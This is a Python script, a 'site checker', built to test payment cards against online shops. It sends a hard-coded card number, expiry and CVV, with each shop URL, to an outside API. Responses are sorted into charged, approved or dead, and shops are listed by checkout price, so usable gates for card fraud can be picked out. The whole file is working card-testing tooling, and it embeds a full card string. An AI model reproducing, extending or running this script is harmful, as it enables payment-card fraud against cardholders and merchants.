#!/usr/bin/env python3
"""
Advanced Site Checker with Auto-Filter & Price Range Export
Checks sites, automatically categorizes by price, and generates organized text files
"""

import asyncio
import aiohttp
import aiofiles
import json
import re
import os
import sys
import time
from datetime import datetime
from urllib.parse import urlparse
from collections import defaultdict
import random

# =============================================
# CONFIGURATION
# =============================================

CONFIG = {
    'max_sites': 10000,           # Maximum sites to check
    'batch_size': 20,             # Sites to check in parallel
    'timeout': 90,                # Timeout per site (seconds)
    'retry_attempts': 3,          # Retry attempts for failed sites
    'test_card': '4031630422575208|01|2030|280',
    'output_dir': 'site_results',
    'api_url': 'https://teamoicxkiller.online/code/index.php',
    'delay_between_batches': 0.5, # Delay between batches (seconds)
}

# Price Categories (Customize as needed)
PRICE_CATEGORIES = {
    'free': {'min': 0, 'max': 0, 'label': '0_FREE'},
    '0-5': {'min': 0.01, 'max': 5, 'label': '0_to_5'},
    '5-10': {'min': 5, 'max': 10, 'label': '5_to_10'},
    '10-20': {'min': 10, 'max': 20, 'label': '10_to_20'},
    '20-50': {'min': 20, 'max': 50, 'label': '20_to_50'},
    '50-100': {'min': 50, 'max': 100, 'label': '50_to_100'},
    '100-200': {'min': 100, 'max': 200, 'label': '100_to_200'},
    '200-500': {'min': 200, 'max': 500, 'label': '200_to_500'},
    '500-1000': {'min': 500, 'max': 1000, 'label': '500_to_1000'},
    '1000+': {'min': 1000, 'max': float('inf'), 'label': '1000_plus'},
}

# Status Categories
STATUS_CATEGORIES = {
    'charged': '💎 CHARGED',
    'approved': '✅ APPROVED',
    'declined': '❌ DECLINED',
    'dead': '💀 DEAD',
    'error': '⚠️ ERROR',
    'unknown': '❓ UNKNOWN'
}

# Dead Site Indicators
DEAD_INDICATORS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'HTTPERROR504', 'http error',
    'httperror504', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'url rejected', 'malformed input', 'amount_too_small',
    'SITE DEAD', 'site dead', 'CAPTCHA_REQUIRED',
    'captcha_required', 'captcha required', 'Site errors',
    'Site errors: Failed to tokenize card', 'Failed'
]

# Charged Indicators
CHARGED_INDICATORS = [
    'charged', 'order completed', 'thank you',
    'payment successful', '💎', 'Order completed'
]

# Approved Indicators  
APPROVED_INDICATORS = [
    'invalid_cvv', 'incorrect_cvv', 'insufficient_funds',
    'approved', 'success', 'invalid_cvc', 'incorrect_cvc',
    'incorrect_zip', 'insufficient funds', 'cvv', 'cvc'
]

# =============================================
# UTILITY FUNCTIONS
# =============================================

def is_valid_url_or_domain(url):
    """Check if URL/domain is valid"""
    domain = url.lower().strip()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
            domain = parsed.netloc
        except:
            return False
    # Remove www. if present
    domain = domain.replace('www.', '')
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls_from_text(text):
    """Extract valid URLs/domains from text"""
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        # Clean line
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip())
        cleaned = cleaned.split(' ')[0] if cleaned else ''
        if cleaned and is_valid_url_or_domain(cleaned):
            clean_urls.add(cleaned)
    return list(clean_urls)

def parse_price(price_str):
    """Parse price string to float"""
    if not price_str or price_str == '-' or price_str == 'Unknown' or price_str == 'N/A':
        return None
    try:
        # Remove currency symbols and convert
        cleaned = price_str.replace('$', '').replace('USD', '').replace('EUR', '').replace('GBP', '').strip()
        return float(cleaned)
    except:
        return None

def get_price_category(price_value):
    """Get price category label for a price value"""
    if price_value is None:
        return 'unknown'
    for category, info in PRICE_CATEGORIES.items():
        if info['min'] <= price_value <= info['max']:
            return info['label']
    return 'unknown'

def is_site_dead(response_text):
    """Check if site is dead based on response"""
    if not response_text:
        return True
    response_lower = response_text.lower()
    return any(indicator.lower() in response_lower for indicator in DEAD_INDICATORS)

def is_charged(response_text):
    """Check if site returned charged status"""
    if not response_text:
        return False
    response_lower = response_text.lower()
    return any(indicator.lower() in response_lower for indicator in CHARGED_INDICATORS)

def is_approved(response_text):
    """Check if site returned approved status"""
    if not response_text:
        return False
    response_lower = response_text.lower()
    return any(indicator.lower() in response_lower for indicator in APPROVED_INDICATORS)

def clean_site_url(site):
    """Clean and format site URL"""
    site = site.strip()
    if not site.startswith(('http://', 'https://')):
        site = f'https://{site}'
    return site

def format_site_output(site_data):
    """Format site data for output file"""
    status_emoji = {
        'charged': '💎',
        'approved': '✅',
        'declined': '❌',
        'dead': '💀',
        'error': '⚠️',
        'unknown': '❓'
    }
    emoji = status_emoji.get(site_data.get('status', 'unknown'), '❓')
    price = site_data.get('price', '-')
    gateway = site_data.get('gateway', 'Unknown')
    response = site_data.get('response', '')[:80]
    return f"{emoji} {site_data['site']} | ${price} | {gateway} | {response}"

# =============================================
# MAIN CHECKER CLASS
# =============================================

class SiteChecker:
    def __init__(self, config=None):
        self.config = config or CONFIG
        self.results = {
            'charged': [],
            'approved': [],
            'declined': [],
            'dead': [],
            'error': [],
            'by_price': defaultdict(list),
            'all': []
        }
        self.stats = {
            'total': 0,
            'checked': 0,
            'charged': 0,
            'approved': 0,
            'declined': 0,
            'dead': 0,
            'error': 0,
            'by_price': defaultdict(int)
        }
        self.start_time = None
        self.end_time = None
        
        # Create output directory
        os.makedirs(self.config['output_dir'], exist_ok=True)
        print(f"📁 Output directory: {self.config['output_dir']}")
    
    def print_header(self, text, char='='):
        """Print formatted header"""
        print("\n" + char * 60)
        print(f" {text}")
        print(char * 60)
    
    async def test_single_site(self, site):
        """Test a single site"""
        site = clean_site_url(site)
        
        try:
            url = f"{self.config['api_url']}?cc={self.config['test_card']}&url={site}"
            
            timeout = aiohttp.ClientTimeout(total=self.config['timeout'])
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as response:
                    if response.status != 200:
                        return {
                            'site': site,
                            'status': 'error',
                            'response': f'HTTP {response.status}',
                            'price': '-',
                            'price_value': None,
                            'gateway': '-'
                        }
                    
                    try:
                        data = await response.json()
                    except:
                        text = await response.text()
                        return {
                            'site': site,
                            'status': 'error',
                            'response': f'Invalid JSON: {text[:100]}',
                            'price': '-',
                            'price_value': None,
                            'gateway': '-'
                        }
                    
                    response_text = data.get('Response', '')
                    price = data.get('Price', '-')
                    gateway = data.get('Gate', 'Shopify')
                    
                    price_value = parse_price(price)
                    
                    # Check status
                    if is_site_dead(response_text):
                        status = 'dead'
                    elif is_charged(response_text):
                        status = 'charged'
                    elif is_approved(response_text):
                        status = 'approved'
                    else:
                        status = 'declined'
                    
                    return {
                        'site': site,
                        'status': status,
                        'response': response_text,
                        'price': price,
                        'price_value': price_value,
                        'gateway': gateway
                    }
                    
        except asyncio.TimeoutError:
            return {
                'site': site,
                'status': 'error',
                'response': 'Timeout',
                'price': '-',
                'price_value': None,
                'gateway': '-'
            }
        except Exception as e:
            return {
                'site': site,
                'status': 'error',
                'response': str(e)[:100],
                'price': '-',
                'price_value': None,
                'gateway': '-'
            }
    
    async def check_sites(self, sites):
        """Check multiple sites"""
        self.start_time = time.time()
        self.stats['total'] = len(sites)
        
        # Limit sites
        if len(sites) > self.config['max_sites']:
            sites = sites[:self.config['max_sites']]
            print(f"⚠️ Limiting to {self.config['max_sites']} sites")
        
        print(f"\n🔍 Checking {len(sites)} sites...")
        print("-" * 60)
        
        # Process in batches
        for i in range(0, len(sites), self.config['batch_size']):
            batch = sites[i:i + self.config['batch_size']]
            
            # Create tasks for batch
            tasks = [self.test_single_site(site) for site in batch]
            
            # Run batch
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for result in batch_results:
                self.stats['checked'] += 1
                
                if isinstance(result, Exception):
                    result = {
                        'site': 'unknown',
                        'status': 'error',
                        'response': str(result),
                        'price': '-',
                        'price_value': None,
                        'gateway': '-'
                    }
                
                # Add to results
                site_data = {
                    'site': result.get('site', 'unknown'),
                    'status': result.get('status', 'unknown'),
                    'response': result.get('response', ''),
                    'price': result.get('price', '-'),
                    'price_value': result.get('price_value'),
                    'gateway': result.get('gateway', '-')
                }
                
                # Add to all results
                self.results['all'].append(site_data)
                
                # Add to status category
                status = site_data['status']
                if status in self.results:
                    self.results[status].append(site_data)
                    self.stats[status] += 1
                else:
                    self.results['unknown'].append(site_data)
                
                # Add to price category
                if site_data['price_value'] is not None:
                    category = get_price_category(site_data['price_value'])
                    self.results['by_price'][category].append(site_data)
                    self.stats['by_price'][category] += 1
                
                # Progress update
                if self.stats['checked'] % 10 == 0 or self.stats['checked'] == self.stats['total']:
                    charged = self.stats['charged']
                    approved = self.stats['approved']
                    print(f"  Progress: {self.stats['checked']}/{self.stats['total']} | 💎{charged} ✅{approved}")
            
            # Small delay between batches
            await asyncio.sleep(self.config['delay_between_batches'])
        
        self.end_time = time.time()
        print("-" * 60)
        print(f"✅ Completed! Checked {self.stats['checked']} sites")
    
    def get_summary(self):
        """Get summary statistics"""
        return {
            'total': self.stats['checked'],
            'charged': self.stats['charged'],
            'approved': self.stats['approved'],
            'declined': self.stats['declined'],
            'dead': self.stats['dead'],
            'error': self.stats['error'],
            'by_price': dict(self.stats['by_price']),
            'time_taken': round(self.end_time - self.start_time, 2) if self.end_time else 0
        }
    
    def save_results(self, prefix=''):
        """Save results to organized files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        prefix = f"{prefix}_{timestamp}" if prefix else timestamp
        
        print("\n💾 Saving results...")
        
        # 1. Save summary
        summary = self.get_summary()
        summary_file = f"{self.config['output_dir']}/SUMMARY_{prefix}.txt"
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write(" SITE CHECKER SUMMARY REPORT\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"⏱️  Time Taken: {summary['time_taken']} seconds\n\n")
            f.write("-" * 70 + "\n")
            f.write(" STATUS BREAKDOWN\n")
            f.write("-" * 70 + "\n\n")
            f.write(f"  Total Sites Checked: {summary['total']}\n")
            f.write(f"  💎 Charged: {summary['charged']}\n")
            f.write(f"  ✅ Approved: {summary['approved']}\n")
            f.write(f"  ❌ Declined: {summary['declined']}\n")
            f.write(f"  💀 Dead: {summary['dead']}\n")
            f.write(f"  ⚠️ Error: {summary['error']}\n\n")
            
            f.write("-" * 70 + "\n")
            f.write(" PRICE CATEGORY BREAKDOWN\n")
            f.write("-" * 70 + "\n\n")
            
            # Sort price categories by numeric value
            sorted_prices = sorted(
                [(k, v) for k, v in summary['by_price'].items() if k != 'unknown'],
                key=lambda x: x[0]
            )
            
            for category, count in sorted_prices:
                label = category.replace('_', ' - ').replace('0 to', '0-').replace('F R E E', 'FREE')
                f.write(f"  💰 ${label}: {count} sites\n")
            
            f.write("\n" + "=" * 70 + "\n")
            f.write(" END OF SUMMARY\n")
            f.write("=" * 70 + "\n")
        
        print(f"  ✅ Summary: {summary_file}")
        
        # 2. Save by status
        for status, sites in self.results.items():
            if status == 'all' or status == 'by_price' or not sites:
                continue
            
            status_label = STATUS_CATEGORIES.get(status, status.upper())
            status_file = f"{self.config['output_dir']}/{status.upper()}_{prefix}.txt"
            
            with open(status_file, 'w', encoding='utf-8') as f:
                f.write(f"{status_label} SITES\n")
                f.write("=" * 70 + "\n")
                f.write(f"Total: {len(sites)} sites\n")
                f.write("=" * 70 + "\n\n")
                
                # Format each site
                for idx, site in enumerate(sites, 1):
                    price = site.get('price', '-')
                    gateway = site.get('gateway', 'Unknown')
                    response = site.get('response', '')[:100]
                    f.write(f"{idx:4d}. {site['site']} | ${price} | {gateway}\n")
                    f.write(f"     Response: {response}\n\n")
            
            print(f"  ✅ {status_label}: {status_file}")
        
        # 3. Save by price category
        for category, sites in self.results['by_price'].items():
            if not sites:
                continue
            
            # Sort sites by price
            sites_sorted = sorted(sites, key=lambda x: x.get('price_value', 0) or 0)
            
            price_file = f"{self.config['output_dir']}/PRICE_{category}_{prefix}.txt"
            
            with open(price_file, 'w', encoding='utf-8') as f:
                label = category.replace('_', ' - ').replace('0 to', '0-')
                f.write(f"💰 PRICE RANGE: {label}\n")
                f.write("=" * 70 + "\n")
                f.write(f"Total: {len(sites_sorted)} sites\n")
                f.write("=" * 70 + "\n\n")
                
                for idx, site in enumerate(sites_sorted, 1):
                    status_emoji = '💎' if site['status'] == 'charged' else '✅' if site['status'] == 'approved' else '❌'
                    price = site.get('price', '-')
                    gateway = site.get('gateway', 'Unknown')
                    f.write(f"{idx:4d}. {status_emoji} {site['site']} | ${price} | {gateway}\n")
            
            print(f"  ✅ Price {label}: {price_file}")
        
        # 4. Save all sites (full details)
        all_file = f"{self.config['output_dir']}/ALL_SITES_{prefix}.txt"
        with open(all_file, 'w', encoding='utf-8') as f:
            f.write("ALL CHECKED SITES\n")
            f.write("=" * 70 + "\n")
            f.write(f"Total: {len(self.results['all'])} sites\n")
            f.write("=" * 70 + "\n\n")
            
            for idx, site in enumerate(self.results['all'], 1):
                status_emoji = {
                    'charged': '💎', 'approved': '✅', 'declined': '❌',
                    'dead': '💀', 'error': '⚠️', 'unknown': '❓'
                }.get(site['status'], '❓')
                price = site.get('price', '-')
                gateway = site.get('gateway', 'Unknown')
                response = site.get('response', '')[:80]
                f.write(f"{idx:4d}. {status_emoji} {site['site']} | ${price} | {gateway}\n")
                f.write(f"     Response: {response}\n\n")
        
        print(f"  ✅ All Sites: {all_file}")
        
        # 5. Save JSON for programmatic use
        json_file = f"{self.config['output_dir']}/results_{prefix}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            # Convert defaultdict to dict for JSON
            results_clean = {
                'summary': summary,
                'charged': self.results['charged'],
                'approved': self.results['approved'],
                'declined': self.results['declined'],
                'dead': self.results['dead'],
                'error': self.results['error'],
                'by_price': dict(self.results['by_price']),
                'all': self.results['all']
            }
            json.dump(results_clean, f, indent=2, default=str)
        
        print(f"  ✅ JSON: {json_file}")
        
        print("\n" + "=" * 70)
        print(" ✅ ALL RESULTS SAVED SUCCESSFULLY!")
        print("=" * 70)
        
        return summary
    
    def print_summary(self):
        """Print summary to console"""
        summary = self.get_summary()
        
        self.print_header("📊 SITE CHECKER SUMMARY", "=")
        print(f"  Total Sites Checked: {summary['total']}")
        print(f"  ⏱️  Time Taken: {summary['time_taken']} seconds")
        print("-" * 60)
        print("  STATUS BREAKDOWN:")
        print(f"    💎 Charged:  {summary['charged']:4d}")
        print(f"    ✅ Approved: {summary['approved']:4d}")
        print(f"    ❌ Declined: {summary['declined']:4d}")
        print(f"    💀 Dead:     {summary['dead']:4d}")
        print(f"    ⚠️ Error:    {summary['error']:4d}")
        print("-" * 60)
        print("  PRICE CATEGORIES:")
        
        if summary['by_price']:
            # Sort by price category
            sorted_prices = sorted(
                [(k, v) for k, v in summary['by_price'].items() if k != 'unknown'],
                key=lambda x: x[0]
            )
            for category, count in sorted_prices:
                label = category.replace('_', ' - ').replace('0 to', '0-')
                print(f"    💰 ${label}: {count:4d} sites")
        else:
            print("    No price data available")
        print("=" * 60)

# =============================================
# MAIN FUNCTION
# =============================================

async def main():
    """Main entry point"""
    print("\n" + "=" * 70)
    print(" 🚀 ADVANCED SITE CHECKER")
    print(" With Auto-Filter & Price Range Export")
    print("=" * 70)
    
    # Create checker instance
    checker = SiteChecker()
    
    # Get input method
    print("\n📥 Choose input method:")
    print("  1. Load from sites.txt (default)")
    print("  2. Load from custom file")
    print("  3. Enter sites manually")
    print("  4. Load from clipboard text")
    
    choice = input("\nEnter choice (1-4): ").strip() or "1"
    
    sites = []
    
    if choice == "1":
        try:
            with open('sites.txt', 'r', encoding='utf-8') as f:
                content = f.read()
            sites = extract_urls_from_text(content)
            print(f"✅ Loaded {len(sites)} sites from sites.txt")
        except FileNotFoundError:
            print("❌ sites.txt not found!")
            print("Creating sites.txt with example...")
            with open('sites.txt', 'w') as f:
                f.write("https://example1.com\nhttps://example2.com\n")
            sites = []
            return
    
    elif choice == "2":
        file_path = input("Enter file path: ").strip()
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            sites = extract_urls_from_text(content)
            print(f"✅ Loaded {len(sites)} sites from {file_path}")
        except Exception as e:
            print(f"❌ Error loading file: {e}")
            return
    
    elif choice == "3":
        print("\nEnter sites (one per line). Type 'done' when finished:")
        lines = []
        while True:
            line = input()
            if line.lower() == 'done':
                break
            if line.strip():
                lines.append(line)
        content = '\n'.join(lines)
        sites = extract_urls_from_text(content)
        print(f"✅ Found {len(sites)} valid sites")
    
    elif choice == "4":
        print("\nPaste your text containing sites:")
        lines = []
        while True:
            line = input()
            if not line and lines:
                break
            if line:
                lines.append(line)
        content = '\n'.join(lines)
        sites = extract_urls_from_text(content)
        print(f"✅ Found {len(sites)} valid sites")
    
    else:
        print("❌ Invalid choice")
        return
    
    if not sites:
        print("❌ No valid sites found!")
        return
    
    # Show sample
    print(f"\n📝 First {min(10, len(sites))} sites:")
    for i, site in enumerate(sites[:10], 1):
        print(f"  {i:3d}. {site}")
    if len(sites) > 10:
        print(f"  ... and {len(sites) - 10} more")
    
    # Configuration options
    print("\n⚙️  Configuration Options:")
    
    max_sites = input(f"  Max sites to check (default: {CONFIG['max_sites']}): ").strip()
    if max_sites:
        CONFIG['max_sites'] = int(max_sites)
    
    batch_size = input(f"  Batch size (default: {CONFIG['batch_size']}): ").strip()
    if batch_size:
        CONFIG['batch_size'] = int(batch_size)
    
    output_dir = input(f"  Output directory (default: {CONFIG['output_dir']}): ").strip()
    if output_dir:
        CONFIG['output_dir'] = output_dir
    
    # Confirm
    total_to_check = min(len(sites), CONFIG['max_sites'])
    print(f"\n🔍 Ready to check {total_to_check} sites")
    confirm = input("Continue? (y/n): ").strip().lower()
    
    if confirm != 'y':
        print("❌ Cancelled")
        return
    
    # Create checker with config
    checker.config = CONFIG
    os.makedirs(CONFIG['output_dir'], exist_ok=True)
    
    # Run checker
    await checker.check_sites(sites)
    
    # Show summary
    checker.print_summary()
    
    # Save results
    save = input("\n💾 Save results to files? (y/n): ").strip().lower()
    if save == 'y':
        prefix = input("Enter prefix for files (optional): ").strip()
        checker.save_results(prefix)
    
    print("\n✅ Done!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⚠️ Interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
